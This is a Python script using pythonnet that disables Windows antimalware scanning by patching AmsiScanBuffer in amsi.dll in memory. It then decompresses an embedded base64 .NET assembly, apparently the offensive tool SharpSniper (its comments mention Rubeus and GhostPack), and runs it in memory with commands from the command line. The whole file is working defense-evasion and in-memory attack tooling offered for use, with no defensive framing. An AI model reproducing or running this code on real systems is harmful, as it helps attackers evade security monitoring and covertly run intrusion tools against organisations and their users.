import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpSniper.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str](command)
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()